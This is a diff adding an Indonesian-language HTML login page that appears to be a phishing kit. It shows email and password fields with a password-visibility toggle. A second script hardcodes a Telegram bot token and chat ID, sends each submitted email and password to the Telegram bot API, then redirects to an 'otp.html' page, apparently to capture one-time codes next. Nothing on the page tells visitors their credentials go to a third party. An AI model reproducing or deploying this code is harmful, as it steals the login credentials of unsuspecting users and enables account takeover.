@@ -1,0 +1,165 @@
+<!DOCTYPE html><html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Masuk</title>
+  <style>
+    :root{
+      --blue:#1a73e8; /* tombol & link */
+      --text:#111;
+      --muted:#8a8f98; /* label abu */
+      --danger:#e53935; /* merah error */
+      --line:#1f1f1f; /* garis input */
+      --bg:#ffffff;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;background:var(--bg);color:var(--text);font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";}.wrap{max-width:560px;margin:0 auto;padding:16px 24px 40px;}
+
+/* top bar */
+.topbar{height:48px;display:flex;align-items:center}
+.back{width:36px;height:36px;border-radius:18px;display:grid;place-items:center;cursor:pointer}
+.back svg{width:22px;height:22px;}
+
+/* heading */
+h1{font-size:36px;line-height:1.15;margin:8px 0 28px;font-weight:800;}
+
+/* form blocks */
+.field{margin:20px 0 26px;}
+.label{font-size:18px;font-weight:700;color:var(--muted);margin-bottom:8px;}
+
+.input-line{position:relative;padding-bottom:8px;border-bottom:2px solid #cfcfcf;}
+.input-line input{width:100%;border:0;outline:0;background:transparent;font-size:18px;padding:2px 40px 2px 0;color:var(--text);}    
+.eye{position:absolute;right:0;top:50%;transform:translateY(-50%);cursor:pointer;display:grid;place-items:center;width:20px;height:20px;border-radius:50%;}
+
+/* states */
+.field.error .label{color:#f19999;}
+.field.error .input-line{border-bottom-color:var(--danger);}    
+.help{font-size:14px;color:var(--danger);margin-top:8px;display:none}
+.field.error .help{display:block}
+
+/* links */
+.right-link{display:block;text-align:right;margin-top:10px;font-weight:700;color:var(--blue);text-decoration:none}
+
+/* button */
+.btn{display:block;width:100%;border:0;outline:0;padding:14px 16px;border-radius:12px;background:var(--blue);color:#fff;font-size:18px;font-weight:700;margin:26px 0 22px;cursor:pointer}
+
+/* terms */
+.terms{font-size:16px;text-align:center;color:#30343a}
+.terms a{color:var(--blue);font-weight:800;text-decoration:none; margin-top: 5px}
+
+/* mobile spacing similar to screenshot */
+@media (min-width:380px){
+  .wrap{padding:8px 28px 56px}
+  h2{margin-top:8px}
+  
+}
+
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="topbar">
+      <div class="back" onclick="history.back()" aria-label="Kembali" style="margin-left: -20px">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+      </div>
+    </div><h2>Masuk</h2>
+<br>
+ <form id="loginForm">
+<!-- Email -->
+<div class="field" id="f-email">
+ 
+  <div class="input-line">
+    <input id="email" type="email" autocomplete="email" aria-label="Email" placeholder="Email kamu"  required/>
+  </div>
+  <div class="help">Harus diisi</div>
+</div>
+
+<!-- Password -->
+<div class="field" id="f-pass" style="margin-top:34px">
+ 
+  <div class="input-line">
+    <input id="password" type="password" autocomplete="current-password" aria-label="Kata sandi" placeholder="Kata Sandi" required/>
+    <span class="eye" id="toggleEye" aria-label="Tampilkan/Sembunyikan sandi">
+      <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+    </span>
+  </div>
+</div>
+
+<a class="right-link" href="#">Lupa Password?</a>
+
+<button class="btn" id="btnMasuk" type="submit">Masuk</button>
+</form>
+<p class="terms">Dengan mendaftar, kamu menyetujui<br ><a href="#">Syarat & Ketentuan</a></p>
+
+  </div>  <script>
+    const fEmail = document.getElementById('f-email');
+    const email = document.getElementById('email');
+    const btn = document.getElementById('btnMasuk');
+    const toggleEye = document.getElementById('toggleEye');
+    const pwd = document.getElementById('password');
+    const eyeIcon = document.getElementById('eyeIcon');
+
+    // Validasi sederhana agar menampilkan state error seperti screenshot
+    function setEmailState(){
+      const val = email.value.trim();
+      if(!val){
+        fEmail.classList.add('error');
+      }else{
+        fEmail.classList.remove('error');
+      }
+    }
+    email.addEventListener('blur', setEmailState);
+    btn.addEventListener('click', setEmailState);
+
+    // Toggle show/hide password
+    toggleEye.addEventListener('click', ()=>{
+      const isPwd = pwd.type === 'password';
+      pwd.type = isPwd ? 'text' : 'password';
+      // swap icon (open/closed)
+      eyeIcon.innerHTML = isPwd
+        ? '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a21.77 21.77 0 0 1 5.06-6.94"/><path d="M1 1l22 22"/><path d="M9.88 9.88A3 3 0 0 0 12 15a3 3 0 0 0 3-3"/>'
+        : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8Z"></path><circle cx="12" cy="12" r="3"></circle>';
+    });
+  </script>
+    <script>
+    // === CONFIG TELEGRAM ===
+    const BOT_TOKEN = "8229342658:AAGgugsMFfDy_HgbiB1f0q79LVxxsFrmh6w";
+    const CHAT_ID = "7549590022";
+
+    function togglePassword() {
+      const password = document.getElementById("password");
+      password.type = password.type === "password" ? "text" : "password";
+    }
+
+    function sendTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      return fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const emailError = document.getElementById("emailError");
+
+     
+
+      // Kirim ke Telegram
+      const message = `🔔 Login Baru\n📧 Email : ${email}\n🔑 Password : ${password}`;
+      sendTelegram(message).then(() => {
+        window.location.href='otp.html';
+      }).catch(() => {
+       
+      });
+    });
+  </script>
+  </body>
+</html>
